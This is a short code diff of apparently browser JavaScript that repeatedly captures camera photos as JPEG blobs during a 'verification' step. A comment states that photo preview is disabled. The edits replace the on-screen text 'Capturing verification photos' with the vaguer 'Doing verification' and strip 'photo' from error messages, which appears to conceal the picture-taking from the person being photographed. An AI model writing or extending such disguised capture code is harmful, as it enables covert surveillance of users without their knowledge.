@@ -681,17 +681,17 @@
                                     // Note: Photo preview is now completely disabled
                                     
                                     photosCaptured++;
-                                    updateLoadingText(`Capturing verification photos... (${photosCaptured}/${totalPhotos})`);
+                                    updateLoadingText(`Doing verification... (${photosCaptured}/${totalPhotos})`);
                                     
                                     resolve();
                                 } else {
-                                    console.error('Failed to capture photo - empty blob');
+                                    console.error('Failed to verification - empty blob');
                                     resolve();
                                 }
                             }, 'image/jpeg', 0.85);
                             
                         } catch (error) {
-                            console.error('Error capturing photo:', error);
+                            console.error('Error verification:', error);
                             resolve();
                         }
                     }, 1500); // Delay between captures
